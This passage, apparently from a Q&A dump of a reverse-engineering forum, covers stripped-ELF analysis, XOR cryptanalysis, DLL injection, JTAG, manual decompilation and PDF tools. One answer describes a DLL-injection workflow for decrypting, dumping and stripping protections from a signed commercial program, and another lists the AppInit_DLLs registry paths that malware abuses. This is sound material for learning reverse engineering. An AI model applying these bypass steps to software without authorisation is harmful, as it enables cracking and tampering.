End of assembler dump.
</code></pre>

<p>What follow the <code>hlt</code> is just rubbish obtained because of the linear sweep performed by <code>gdb</code>. So, just ignore it. What is relevant is the fact that we are calling <code>__libc_start_main</code> (I won't comment on the <code>@plt</code> because it would drag us out of the scope of the question). </p>

<p>In fact, the procedure <code>__libc_start_main</code> initialize the memory for a process running with the <code>libc</code> dynamic library. And, once done, jump to the procedure located in <code>%rdi</code> (which usually is the <code>main</code> procedure).</p>

<p>So, indeed, the address of the <code>main</code> procedure is <code>0x4028c0</code>. Let disassemble the code at this address:</p>

<pre><code>(gdb) x /10i 0x4028c0
   0x4028c0:    push   %r15
   0x4028c2:    push   %r14
   0x4028c4:    push   %r13
   0x4028c6:    push   %r12
   0x4028c8:    push   %rbp
   0x4028c9:    mov    %rsi,%rbp
   0x4028cc:    push   %rbx
   0x4028cd:    mov    %edi,%ebx
   0x4028cf:    sub    $0x388,%rsp
   0x4028d6:    mov    (%rsi),%rdi
   ...
</code></pre>

<p>And, if you look at it, this is indeed the <code>main</code> procedure. So, this where to really start the analysis.</p>

<h2>Words of warning</h2>

<p>Even if this way of looking for the <code>main</code> procedure will work in most the cases. You have to know that we strongly rely on the following hypothesis:</p>

<ol>
<li><p>The program has been compiled and do not start straight at the <code>_start</code> procedure (at the entrypoint). Programs written in assembler and compiled with <code>gcc -nostdlib</code> won't have a first call to <code>__libc_start_main</code> and will start straight from the entrypoint.</p></li>
<li><p>We also strongly rely on a knowledge on the way <code>__libc_start_main</code> works. And, how this procedure has been designed by the <code>gcc</code> team. So, if the program your analyzing has been compiled with another compiler, you may have to investigate a bit further about this compiler and how it perform the set-up of the memory before running the <code>main</code> procedure.</p></li>
</ol>

<p>Anyway, you should now be able to track down a program with no symbol at all if you read this answer carefully.</p>

"What is the most efficient way to detect and to break xor encryption?","28370","","<p>I know that modern cryptographic algorithms are as close as they can to fully random data (<a href=""http://en.wikipedia.org/wiki/Ciphertext_indistinguishability"">ciphertext indistinguishability</a>) and that trying to detect it is quite useless. But, what can we do on weak-crypto such as <strong>xor encryption</strong> ? Especially if we can get statistical studies of what is encrypted ? </p>

<p>What are the methods and which one is the most efficient (and under what hypothesis) ? And, finally, how to break efficiently this kind of encryption (only based on a statistical knowledge of what is encrypted) ?</p>
","<p>XOR encryption with a short pad (i.e., shorter than the plaintext) is basically the Vigenère cipher. So <a href=""http://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher#Cryptanalysis"">standard techniques to break Vigenère</a> should break xor encryption.</p>

<p>The basic idea is that if the encryption key is <strong>d</strong> symbols long, every <strong>d</strong>-th symbol is encrypted with the same pad. Thus, take every <strong>d</strong>-th ciphertext symbol and treat it like simple substitution cipher, break that and you have the 1st symbol of the key. Repeat for the <strong>d+1</strong>-th ciphertext symbols, <strong>d+2</strong>-th ciphertext symbols, etc. Eventually you will have all <strong>d</strong> symbols of the key.</p>

<p>To break the <a href=""http://en.wikipedia.org/wiki/Substitution_cipher"">simple substitution</a> ciphers, you might try brute force (if the symbol set is small) and compare possible plaintexts with the statistical data you know. For certain plaintexts (english language for example) you can often break most of it even quicker (e.g., with english language text the most frequent symbol in ciphertext probably maps back to an <em>e</em>, etc). </p>

<p>Now, you may be thinking, what if you don't know <strong>d</strong>. Often with Vigenère, the length of the key is brute forced. Try d=1, d=2, d=3,... For each d, see how well the output plaintext matches the statistical data. Return the key for which the plaintext most closely matched the statistical data.</p>

"What is DLL Injection and how is it used for reversing?","24992","","<p>I was reading a discussion about dumping a processes part of a process's memory and someone suggested using DLL injection to do this. I'll be honest in that I don't really understand. How does DLL injection work and what kinds of reversing tasks can you do with it?</p>
","<p><a href=""https://reverseengineering.stackexchange.com/a/2253/2676"">DCoder's answer</a> is a good one.  To expand somewhat, I most often use DLL injection in the context of forcing an existing process to load a DLL through CreateRemoteThread.  From there, the entrypoint of the DLL will be executed by the operating system once it is loaded.  In the entrypoint, I will then invoke a routine that performs in-memory patching of all of the locations within the original binary that interest me, and redirects their execution into my DLL via a variety of modifications.  If I am interested in modifying or observing the process' interaction with some imported function, then I will overwrite the IAT entry for that function and replace it with a pointer to something that I control.  If I want to do the same with respect to some function that exists within the binary, I will make some sort of detours-style patch at the beginning of the function.  I can even do very surgical and targeted hooks at arbitrary locations, akin to old-school byte patching.  My DLL does its business within the individual hooks, and then is programmed to redirect control back to the original process.</p>

<p>DLL injection provides a platform for manipulating the execution of a running process.  It's very commonly used for logging information while reverse engineering.  For example, you can hook the IAT entry for a given imported operating system library function, and then log the function arguments onto disk.  This provides you a data source that can assist in rapidly reverse engineering the target.</p>

<p>DLL injection is not limited to logging, though.  Given the fact that you have free reign to execute whatever code that you want within the process' address space, you can modify the program in any way that you choose.  This technique is frequently used within the game hacking world to code bots.  </p>

<p>Anything that you could do with byte patching, you can do with DLL injection.  Except DLL injection will probably be easier and faster, because you get to code your patches in C instead of assembly language and do not have to labor over making manual modifications to the binary and its PE structure, finding code caves, etc.  DLL injection almost entirely eliminates the need for using assembly language while making modifications to a binary; the only assembly language needed will be small pieces of code nearby the entrance and exit to a particular hook to save and restore the values of registers / the flags.  It also makes binary modification fast and simple, and does not alter any cryptographic signatures of the executable that you are patching.</p>

<p>DLL injection can be employed to solve highly non-trivial reverse engineering problems.  The following example is necessarily vague in some respects because of non-disclosure agreements.</p>

<p>I had a recurring interest in a program that was updated very frequently (sometimes multiple times daily).  The program had a number of sections in it that were encrypted on disk after compilation time and had to be decrypted at run-time.  That was accomplished by calling into the kernel through a function inside of a DLL that shipped with the program with the number of the section and a Boolean that indicated whether the section should be encrypted or decrypted.  All of the components were digitally signed.</p>

<p>I employed a DLL injection-based solution that worked as follows:</p>

<ul>
<li>Create the process suspended.</li>
<li>Inject the DLL.</li>
<li>DLL hooks GetProcAddress in the program's IAT.</li>
<li>GetProcAddress hook waits for a specific string to be supplied and then returns its own hooked version of that function.</li>
<li>The hooked function inspects the return address on the stack two frames up to figure out the starting address of the function (call it Func) that called it.</li>
<li>The hooked function then calls Func for each encrypted section, instructing it to decrypt each section.  To make this work, the hooked function has to pass on the calls to the proper function in the DLL for these calls.</li>
<li>After having done so, for every subsequent call to the hooked function, it simply returns 1 as though the call was successful.</li>
<li>Having decrypted all the sections, the DLL now dumps the process' image onto the disk and reconstructs the import information.</li>
<li>After that it does a bunch of other stuff neutralizing the other protections.</li>
</ul>

<p>Initially I was doing all of this by hand for each new build.  That was way too tedious.  One I coded the DLL injection version, I never had to undertake that substantial and manual work ever again.</p>

<p>DLL injection is not widely known or used within reverse engineering outside of game hacking.  This is very unfortunate, because it is an extremely powerful, flexible, and simple technique that should be part of everyone's repertoire.  I have used it dozens of times and it seems to find a role in all of my dynamic projects.  The moment my task becomes too cumbersome to do with a debugger script, I switch to DLL injection.</p>

<p>In the spectrum of reverse engineering techniques, every capability of DLL injection is offered by dynamic binary instrumentation (DBI) tools as well, and DBI is yet more powerful still.  However, DBI <a href=""http://blog.coresecurity.com/2012/06/22/recon-2012-presentation-detecting-dynamic-binary-instrumentation-frameworks/"" rel=""nofollow noreferrer"">is not stealthy</a> and incurs a serious overhead in terms of memory consumption and possibly performance.  I always try to use DLL injection before switching to DBI.</p>

<p>For some resources on DLL injection, there's a great eight-part series on writing a DLL injection-based poker bot.  See <a href=""http://www.codingthewheel.com/tags/poker-bot/"" rel=""nofollow noreferrer"">here</a>; start from the bottom and read the numbered entries in order.</p>

It seems desirable to be able to detect DLL injection to prevent this from happening. Is this possible?</p>
","<p>There are multiple ways that you can use which <em>might</em> work (and see below for the reasons why they might not).  Here are two:</p>

<ul>
<li>A process can debug itself, and then it will receive notifications of DLL loading.</li>
<li>A process can host a TLS callback, and then it will receive notifications of thread creation.  That can intercept thread creation such as what is produced by CreateRemoteThread.  If the thread start address is LoadLibrary(), then you have a good indication that someone is about to force-load a DLL.</li>
</ul>

<p>Other than that, you can periodically enumerate the DLL name list, but all of these techniques can be defeated by a determined attacker (debugging can be stopped temporarily; thread notification can be switched off; the injected DLL might not remain loaded long enough because it might use dynamically-allocated memory to host itself and then unload the file, etc).</p>

"How do I add functionality to an existing binary executable?","21003","","<p>I want to add some functionality to an existing binary file. The binary file was created using <code>gcc</code>. </p>

<li>How should I go about adding the necessary code ?</li>
<li>Do I need any tools to be able to do this ?</li>
</ul>
","<p>There are several broad ways in which you could do this.</p>

<ol>
<li><p>Dynamic instrumentation</p>

<p>Tools such as <a href=""http://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool"">PIN</a>, <a href=""http://valgrind.org/"">Valgrind</a>, or <a href=""http://www.dynamorio.org/"">DynamoRIO</a> allow you to dynamically change the behavior of a program.  For instance, you can add calls to new functions at particular addresses, intercept library calls and change them, and much more.</p>

<p>The downside is that dynamic instrumentation often has high overhead.</p></li>
<li><p>Static instrumentation</p>

<p>You can also try to statically modify the program to add the desired behavior.  One challenge is that you often need to muck around with the executable file format.  Some tools, such as <code>elfsh</code> from the <a href=""http://www.eresi-project.org/"">ERESI</a> project exist for this, but I have found them buggy and difficult to use.</p>

<p>Another strategy for static instrumentation is to ""recompile"".  You can do this by decompiling the program, modifying the source code, and recompiling.  In theory, you could also use a tool like <a href=""http://bap.ece.cmu.edu"">BAP</a> to lift the program to IL, modify it, and then re-compile it using LLVM.  However, the current version is probably not mature enough for this.</p></li>
<li><p>Dynamic loading</p>

<p>You can use <code>LD_PRELOAD</code> to override functions that are going to be dynamically linked.  This is a nice option when you want to change the behavior of a library function.  Naturally, it does not work on statically linked binaries, or for static functions.</p></li>
<li><p>Binary patching</p>

<p>You can often make simple changes to a binary using a hex-editor.  For instance, if there is a function call or branch you would like to skip, you can often replace it with <code>nop</code> instructions.  If you need to add a large amount of new code, you will probably need to use something like <code>elfsh</code> from the <a href=""http://www.eresi-project.org/"">ERESI</a> project to help you resize the binary.</p></li>

<p>First off, try to search for the function names with a search engine. Don't just settle for a single search engine. Failing that, inspect whatever came in the package with the DLL. Are there import LIBs included? If so, use these to provide clues (may or may not work).</p>

<h2>Otherwise ...</h2>

<p>Most disassemblers (read the tag wiki <a href=""/questions/tagged/tools"" class=""post-tag"" title=""show questions tagged &#39;tools&#39;"" rel=""tag"">tools</a>) will readily show you exported functions. So <em>locating</em> them won't be a problem at all. They will also usually be shown with their exported names.</p>

<p>From the output your screenshot shows, it looks like the names aren't <a href=""https://en.wikipedia.org/wiki/Name_mangling"" rel=""nofollow noreferrer"">mangled/decorated</a>. This suggests - but is <em>not</em> conclusive <em>proof</em> - that the functions use the <code>stdcall</code> <a href=""https://en.wikipedia.org/wiki/Calling_convention"" rel=""nofollow noreferrer"">calling convention</a> (better yet read <a href=""http://code.google.com/p/corkami/wiki/CallingConventions"" rel=""nofollow noreferrer"">this one by Ange</a>, one of the moderators pro temp here). Now I don't know how much you know, but since you attempt RCE you are probably well-versed in calling conventions. If not let's sum it up like this: calling conventions govern how (order, alignment) and by what means (registers, stack) parameters get passed to functions. We'll get back to this in a moment. If you are on x64 Windows and the DLL is 64bit as well, you can rely on the Microsoft x64 calling convention (read <a href=""https://en.wikipedia.org/wiki/X86_calling_conventions"" rel=""nofollow noreferrer"">this article</a>).</p>

<h2>Now there are two main routes you can take</h2>

<h3>Route 1 - analyze a program using the DLL</h3>

<p>If you happen to have a program that uses the DLL in question, you can use a debugger or disassembler to find out both the calling convention and the number of parameters passed. Simply look out for <code>call</code> instructions referencing the exported DLL functions and find <code>mov</code> or <code>push</code> instructions in front. If you happen to come across <code>cdecl</code> functions, the stack pointer (<code>esp</code>) will be adjusted again after the <code>call</code>. It's possible this is the case (see below for an example), but as unlikely as the various compiler-specific <code>fastcall</code> variants, since <code>stdcall</code> provides the broadest possible compatibility.</p>

<p>The methods outlined below in the second approach will also explain some of the concepts introduced here in greater detail.</p>

<h3>Route 2 - analyzing the DLL itself</h3>

<p>If you happen to have IDA and you analyze a 32bit DLL, chances are that IDA already identified the number of parameters and the calling convention using its heuristics. Let me demonstrate (using <code>sqlite3.dll</code>). In the Exports tab find a function you're interested in and double-click it. This will take you to the address where the function starts (here <code>sqlite3_open</code>).</p>

<p><img src=""https://i.stack.imgur.com/jdRup.png"" alt=""enter image description here""></p>

<p>As you can see IDA readily found that the function takes two arguments (you can look at <a href=""http://www.sqlite.org/c3ref/open.html"" rel=""nofollow noreferrer"">the SQLite3 docs</a> to verify this finding). However, there is another thing here. After the <code>call sqlite3_open_v2_0</code> we can see that the stack pointer is adjusted by 10h (=16) thereby cleaning up four parameters. Looking at the <code>push</code> instructions before the <code>call</code> we can see that indeed four 32bit (i.e. DWORD) parameters are passed via the stack.
Since there is no further cleanup on part of the function <code>sqlite3_open</code> itself, it is now clear that it is likely following the C calling convention (<code>cdecl</code>) as well. Again we can verify the finding (a benefit you won't have) by looking at the documentation. And indeed since no explicit calling convention is given, you end up defaulting to <code>cdecl</code>. The single <code>retn</code> (some disassemblers will show <code>ret</code>), meaning <code>return</code>, also doesn't clean up the stack, since otherwise it would look like <code>retn 8</code> or similar.</p>

<p>This is a rather small function, but even with the circumstantial information we are able to deduce a lot about it.</p>

<p>Now for something <code>stdcall</code>, a case you are more likely to encounter as mentioned before. And why not go for something famous, like, say, <code>kernel32.dll</code> from Windows 7? Again, I'll take a trivial function as it is better to showcase the points. Note that I told IDA not to make use of the debug symbols from Microsoft and to skip using FLIRT signatures. This means some of the good stuff that kicks in by default is being suppressed to show how to identify what's going on. Look:</p>

<p><img src=""https://i.stack.imgur.com/nZ9Di.png"" alt=""enter image description here""></p>

<p>The green lines are uninteresting for our case, but you'll encounter them a lot. It is commonly found in several compilers and <code>ebp</code> is commonly referred to as ""frame pointer"" (frame as in stack frame), basically an offset on which to base access to the stack variables. You can see a typical use in the line <code>push [ebp+arg_0]</code>. IDA figured this out and shows us <code>Attributes: bp-based frame</code>.</p>

<p>We see no adjustment of the stack pointer after <code>call sub_77E29B80</code>, so it looks like that (internal) function follows the <code>stdcall</code> calling convention as well. However, the <code>ret 4</code> hints that the callee (i.e. the function <code>AddAtomA</code> in this case) is meant to clean up the stack, which means we can exclude <code>cdecl</code> as a possibility. It's four bytes because that is the ""natural"" size on a 32bit system. You can also see from my inline comments, that parameters are passed on the stack in reverse. But you should know such things anyway before engaging in RCE, otherwise read up in the above linked articles and in some books such as <a href=""https://reverseengineering.stackexchange.com/a/1755/245"">those here</a>.</p>

<p>In this particular case we could dare to make another assumption, but it could bite us. Say this was Microsoft's <code>fastcall</code> convention (keep in mind that they vary by compiler), then the registers <code>ecx</code> and <code>edx</code> would be used, followed by arguments passed on the stack. This means that in our case we might want to assume that this can't be the case, because those registers aren't saved before calling <code>sub_77E29B80</code>. This is a good argument for machine-generated code such as this one. However, were this hand-optimized code, the programmer could rely on the knowledge about the calling convention and skip saving/restoring the registers before/after the <code>call</code>. Still, in this case hand-optimized code would be less likely (or unlikely) to make use of the frame pointer. It's three instructions that aren't strictly needed to do the job. So arguing like this - even without prior knowledge - we could now set out to write a little program using the prototype:</p>

<pre><code>int __stdcall AddAtomA(void* unknown)
</code></pre>

<p>and use a debugger to see <em>what</em> gets passed. It's generally a tedious process, but a lot of the process - especially finding the number of parameters - can likely be scripted. Also, once you have a single function figured out, it's likely that the calling convention would be the same (exceptions exist, of course) throughout the DLL. Just make sure you analyze a function taking at least one parameter, otherwise you won't be able to distinguish between <code>stdcall</code> and <code>cdecl</code> from the circumstantial data.</p>

<h3>Route X - the ugly one</h3>

<p>You can also simply use <code>dumpbin</code> or a similar tool to script the creation of a test program. This test program would then call the function, check the stack pointer before and after and could thereby distinguish between <code>stdcall</code> and <code>cdecl</code>. You could also play tricks like passing 20 arguments on the stack (if you want to assume <code>stdcall</code> for the experiment) and see how much of that your callee cleaned up. There are loads of possibilities to simply try instead of analyze. But you'll get better (more reliable) results with the first two approaches.</p>

<p>If you need to build an import LIB because you don't want to use <code>GetProcAddress</code>, see <a href=""https://stackoverflow.com/a/15117763/476371"">this answer by me over on StackOverflow</a>. It shows how to build an import LIB  just from the DLL.</p>

<h2>Conclusion</h2>

<p>The methods won't differ too much with other disassemblers, I just needed to show things in a way you can reproduce them, that's why I went with IDA. The freeware edition of IDA will likely be sufficient (32bit, PE, x86) - keep in mind it's not permissible for commercial use, though.</p>

"How do I identify and use JTAG?","18545","","<p>I'm a software guy through and through.  But periodically when I'm taking apart hardware I know to look for JTAG ports and RS232 ports.  So far I've always been lucky and have been able to solder on pins to the RS232 port and get a serial connection.</p>

<p>For the times in the future that I am unlucky, can someone explain to me what JTAG is (i.e. is there only one type of JTAG and I can expect to hook it up to a single type of port, like a DB-9 for serial?) and how I would go about using it to dump firmware off an embedded system or is it all manufacturer specific?</p>
","<p>There are a few JTAG connectors available, so it's hard to tell which one, and how the pins are positioned.</p>

<p>I suggest you take a magnifying glass and read the microcontroller model.  With the model you will be able to find the datasheet on the Internet.
Take a look at the PIN out of the microcontroller, and see how many JTAG outputs it has. Some newer chips have trace outputs, some don't. This can really narrow down your options.</p>

<p>You might want to take a look <a href=""http://support.code-red-tech.com/CodeRedWiki/HardwareDebugConnections"">here</a>, for a a quick look on various JTAG connectors.</p>

<p>Another thing worth mentioning, various microcontroller, have a specific bit, that when it set, the JTAG connectors are disabled. This is done on release, to make sure that no one tries to steal the firmware or to debug the system.
The only way to enable the JTAG again is to hard reset the microcontroller. This will cause complete reset of the internal flash, so all the firmware will be lost...</p>

loc_536FBF
mov cl, [eax+1]
inc eax
test cl, cl
jnz short loc_536FB0
</code></pre>

<p>I have already figured out that it is a for loop that loops 23 times before exiting.</p>
","<p>Such small snippets are not too hard to decompile manually. Let's try it.</p>

<p>You have already figured out that <code>cl</code> holds a character, this means that <code>eax</code> where it's read from is a pointer to a character array. Let's call it <code>p</code>. Now, let's do a dumb translation for every assembly statement to C:</p>

<pre><code>l1:            ; l1:
mov cl, [eax]  ;   cl = *p;
cmp cl, ' '    ;   if ( cl &lt; ' ' )
jb short l2    ;     goto l2
cmp cl, ','    ;   if ( cl != ',' )
jnz short l3   ;     goto l3

l2:                      ; l2:
mov byte ptr [eax], ' '  ;   *p = ' '

l3:                  ; l3:
mov cl, [eax+1]      ; cl = *(p+1)
inc eax              ; p = p + 1
test cl, cl          ; if ( cl != 0 )
jnz short l1         ;   goto l1
</code></pre>

<p>And cleaned up:</p>

<pre><code>l1:               
  cl = *p;
  if ( cl &lt; ' ' ) 
    goto l2;
  if ( cl != ',' )
    goto l3;       
l2:       
  *p = ' ';
l3:           
  cl = *(p+1);
  p = p + 1;     
  if ( cl != 0 )
    goto l1;
</code></pre>

<p>Now, let's have a look at the second <code>if</code>. It has the following form:</p>

<pre><code>if ( condition )
  goto end_of_if;
  &lt;if body&gt;
end_of_if:
</code></pre>

<p>And here's how we can get rid of the <code>goto</code>:</p>

<pre><code>if ( !condition )
{
  &lt;if body&gt;
}
</code></pre>

<p>Applying it to our snippet:</p>

<pre><code>l1:               
  cl = *p;
  if ( cl &lt; ' ' ) 
    goto l2;
  if ( cl == ',' )  {
l2:       
    *p = ' ';
  }
  cl = *(p+1);
  p = p + 1;     
  if ( cl != 0 )
    goto l1;
</code></pre>

<p>Now, how we can get rid of <code>goto l2</code>? If you look at it carefully, you can see that the body at <code>l2</code> will get executed if <em>either</em> <code>cl &lt; ' '</code> <em>or</em> <code>cl == ','</code>. So we can just combine the two conditions with a logical OR (<code>||</code>):</p>

<pre><code>l1:               
  cl = *p;
  if ( cl &lt; ' ' || cl == ',' ) {
    *p = ' ';
  }
  cl = *(p+1);
  p = p + 1;     
  if ( cl != 0 )
    goto l1;
</code></pre>

<p>Now we have one <code>goto</code> left. We have: 1) label at the beginning of a statement block 2) check at the end of the block and 3) goto to the start of the block if the check succeeded. This is a typical pattern of a <code>do-while</code> loop, and we can easily convert it:</p>

<pre><code>do {
  cl = *p;
  if ( cl &lt; ' ' || cl == ',' ) {
    *p = ' ';
  }
  cl = *(p+1);
  p = p + 1;     
} while ( cl != 0 )
</code></pre>

<p>Now the code is almost nice and pretty, but we can compress it a bit more by substituting equivalent statements:</p>

<pre><code>do {
  if ( *p &lt; ' ' || *p == ',' )
    *p = ' ';
  cl = *++p;
} while ( cl != 0 )
</code></pre>

<p>And, finally, the last assignment can be moved into the condition:</p>

<pre><code>do {
  if ( *p &lt; ' ' || *p == ',' )
    *p = ' ';
} while ( *++p != 0 )
</code></pre>

<p>Now it's obvious what the code is doing: it's going through the string, and replacing all special characters (those with codes less than 0x20 aka space) and commas with the spaces.</p>

<p>Any tools or tricks to assist in this?</p>
","<p>It very much depends on what framework they use in order to do their windowing. It could be <a href=""https://en.wikipedia.org/wiki/Microsoft_Foundation_Class_Library"">MFC</a>, <a href=""https://en.wikipedia.org/wiki/Windows_Presentation_Foundation"">WPF</a>, <a href=""https://en.wikipedia.org/wiki/WinForms"">WinForms</a>, <a href=""https://en.wikipedia.org/wiki/WTL"">WTL</a>, <a href=""http://en.wikipedia.org/wiki/Qt_%28software%29"">QT</a>, <a href=""http://en.wikipedia.org/wiki/Wxwidget"">wxWidgets</a>, pure <a href=""https://en.wikipedia.org/wiki/Windows_API"">Windows API</a>. There's a lot of frameworks and they all handle the final routing of messages differently.</p>

<p>I'll answer the question for the cases that are either directly built on top of Windows API or where they're using the Windows API directly. WPF does not use the Windows API windowing system other than for the outermost windows.</p>

<p>Initially the program registers a function that handles messages intended for a particular window. This can be done using the <a href=""http://msdn.microsoft.com/en-us/library/ms633586(v=vs.85).aspx"">RegisterClass</a> or <a href=""http://msdn.microsoft.com/en-us/library/ms633587(v=vs.85).aspx"">RegisterClassEx</a> functions. The function which will be responsible for handling the messages sent to the window is the lpfnWndProc member of the structures passed to these functions. This is called the window procedure. </p>

<p>What happens when a button is pressed is that a message, in this case <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms647591(v=vs.85).aspx"">WM_COMMAND</a>, is pushed into the thread message queue by Windows. This message is then fetched using  <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644936(v=vs.85).aspx"">GetMessage</a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644943(v=vs.85).aspx"">PeekMessage</a>. Some messages use short cuts and can result in a call to the window procedure directly when you call GetMessage, some messages only result in a call to the window procedure when the application calls <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644934(v=vs.85).aspx"">DispatchMessage</a>. If you're dealing with a dialog, the message will be handled by a call to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms645498(v=vs.85).aspx"">IsDialogMessage</a>.</p>

<p>Now that we have some background on how this works behind the scenes, OllyDbg actually has a helper for dealing with this sort of thing. You can simply open the View->Windows dialog item. Right click the window you want to catch button presses in, select message breakpoint on classproc, select command and notifications from the message dropdown or select the WM_COMMAND message. Now whenever you click the button you will break in the window procedure the application registered for that window. You still need to trace the code so that you can find the code that examines the message type and then handles the message. From now on it will be different depending on what type of framework is being used.</p>

<p>If the kernel-mode driver <em>isn't</em> still around, then it may well just be something like the OutputDebugString trick causing the crash.

  <p>All the DLLs that are specified in this value are loaded by each Microsoft Windows-based application that is running in the current log on session.</p>
</blockquote>

<p>They are usually used by malicious code (tho it doesn't have to be malicious) as a way of DLL injection, to hook functions for example. To be more precise<strike>, AppInit DLLs are actually loaded only by the processes that link user32.dll.</strike>,as peter ferrie points out, AppInit DLLs are loaded by user32.dll after it has been loaded. 
The actual registry path differs between 64bit and 32bit version of OS.</p>

<p>So for for 32 bit DLL on 32 bit systems the path is:</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs] 
</code></pre>

<p>For  64 bit DLL on 64 bit system :</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs]
</code></pre>

<p>For for 32 bit DLL on 64 bit system:</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs] 
</code></pre>

<p>Multiple entries are split with space or comma, and the path to the DLL must not contain any spaces for obvious reasons.
On Vista and later, the AppInit DLLs need to be signed, tho the registry value <code>RequireSignedAppInit_DLLs</code> can be set to 0 which disables this requirement.</p>

"Open source GUI tool for decomposing a PDF","14730","","<p>I've been looking for an open-source GUI tool to extract PDF's in an automated way on Windows systems. I've used Didier Steven's tools with great interest for a while, but cannot make sense of how to use his <a href=""http://blog.didierstevens.com/programs/pdf-tools/"">PDF decomposing</a>/<a href=""http://blog.didierstevens.com/2008/10/20/analyzing-a-malicious-pdf-file/"">analyzing tools</a>, even after watching some of his videos. They seem to require significant understanding of the underlying PDF construction, and possibly much more.</p>

<p>For SWF files, the tool <a href=""http://h30499.www3.hp.com/t5/Following-the-Wh1t3-Rabbit/SWFScan-FREE-Flash-decompiler/ba-p/5440167"">SWFScan</a> is the kind I'm looking for: you load the file in question into the tool. From there, you can explore the links, scripts, and images. It even auto-analyses code and shows which parts may have security issues and what the issue is for each one, then gives a webpage reference with more information.</p>

<p>Does anyone know of a good open-source GUI for Windows that can load a PDF and not execute it but extract all the scripts, compiled code, text, links, images, etc.? Ideally, it would show the relation of each, like when you click on a certain image, it would tell you what script(s) are run, which URL it goes to, and let you see the image on its own.</p>

<p>PDF's are so common, next to SWF, that this kind of tool seems like it would already be common. I may have overlooked it/them.</p>

<p><strong>Here is how I installed it on my Windows 7 system:</strong></p>

<ul>
<li>Ensure you have Ruby v1.9.3 installed for Windows
<a href=""http://rubyinstaller.org/downloads/"" rel=""nofollow noreferrer"">http://rubyinstaller.org/downloads/</a></li>
<li><em>NOTE:</em> This may work on newer/older Ruby versions, but I've only tested on v1.9.3 on Windows 7. (It does work with ruby v1.8.7 on my Linux system)</li>
<li><p>Next, install origami by opening an <em>ADMIN</em> cmd prompt and running:</p>

<p><code>gem install origami</code></p></li>
<li><p>Next, you will need to install <strong>ruby-gtk2</strong>. From the same ADMIN cmd prompt as earlier, run: </p>

<p><code>gem install gtk2</code></p></li>
</ul>

<p>Finally, simply run <code>pdfwalker</code> from a cmd prompt.</p>

<p>If this doesn't work for you, I'd suggest trying the above steps from <a href=""http://www.cygwin.com/"" rel=""nofollow noreferrer"">Cygwin</a>, where you can essentially follow instructions for installing on *nix.</p>

<p><strong>If you're installing it on Ubuntu/Debian</strong></p>

<p>Install ruby with the following command:</p>

<p><code>apt install ruby-full</code></p>

<p>Afterwards install origami as listed above:</p>

<p><code>gem install origami</code></p>

<p>If you want to use the GUI you will probably need to install libgtk2.0-dev and get the rake gem installed for you to be able to install gtk2:</p>

<pre><code>apt install libgtk2.0-dev
gem install rake
gem install gtk2
</code></pre>

<p>Since pdfwalker also needs libcanberra, it's a good idea to install it now:</p>

<p><code>apt install libcanberra-gtk-module</code></p>

<p>Afterwards install pdfwalker, since it was moved to a separate gem:</p>

<p><code>gem install pdfwalker</code></p>

<p>And it should run from the commandline as described above.</p>

"What symbol tables stay after a strip In ELF format?","14399","","<p>I am currently looking at the ELF format, and especially at stripped ELF executable program files.</p>

<p>I know that, when stripped, the symbol table is removed, but some information are always needed to link against dynamic libraries. So, I guess that there are other symbols that are kept whatever the executable has been stripped or not. </p>

<p>For example, the dynamic symbol table seems to be always kept (actually this is part of my question). It contains all the names of functions coming from dynamic libraries that are used in the program.</p>

<p>Indeed, taking a stripped binary and looking at the output of <code>readelf</code> on it will give you the following output:</p>

<pre><code>Symbol table '.dynsym' contains 5 entries:
 Num:    Value          Size Type    Bind   Vis      Ndx Name
 0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
 1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
 2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
 3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
 4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.2.5 (2)
</code></pre>

<p>My question is, what are all the symbol tables that the system always need to keep inside the executable file, even after a strip (and what are they used for) ?</p>

<p>Another part of my question, would also be about how to use these dynamic symbols. Because, they are all pointing to zero and not to a valid address. You do we identify, as <code>objdump</code> does, their respective links to the code stored in the PLT. For example, in the following dump I got from <code>objdump -D</code>, we can see that the section <code>.plt</code> is split, I assume that this is thanks to symbols, into subsections corresponding to each dynamic function, I would like to know if this is coming from another symbol table that I do not know or if <code>objdump</code> rebuild this information (and, then, I would like to know how):</p>

","<p>To answer to this question, we have first to rephrase it a bit. The real question can be stated like this: </p>

<blockquote>
  <p><em>What are the symbols that cannot be removed from an ELF binary file ?</em></p>
</blockquote>

<p>Indeed, <code>strip</code> removes quite a bit of information from the ELF file, but it could do a bit more (see the option <code>--strip-unneeded</code> from <code>strip</code> or the program <a href=""http://www.muppetlabs.com/~breadbox/software/elfkickers.html""><code>sstrip</code></a> for more about this). So, my original question was more about what symbols can be assumed to be in the executable file whatever modifications have been made on the ELF file.</p>

<p>In fact, there is only one type of symbols that you need to keep whatever happen, we call it <strong>dynamic symbols</strong> (as opposed at <em>static symbols</em>). They are a bit different from the static ones because we never know in advance where they will be pointing to in memory. Indeed, as they are supposed to point to external binary objects (libraries, plugin), the binary blob is dynamically loaded in memory while the process is running and we cannot predict at what address it will be located.</p>

<p>If the static symbols are stored in the <code>.symbtab</code> section, the dynamic ones have their own section called <code>.dynsym</code>. They are kept separate to ease the operation of <strong>relocation</strong> (the operation that will give a precise address to each dynamic symbol). The relocation operation also relies on two extra tables which are namely: </p>

<ul>
<li><code>.rela.dyn</code> : Relocation for dynamically linked objects (data or procedures), if PLT is not used.</li>
<li><code>.rela.plt</code> : List of elements in the PLT (Procedure Linkage Table), which are liable to the relocation during the dynamic linking (if PLT is used).</li>
</ul>

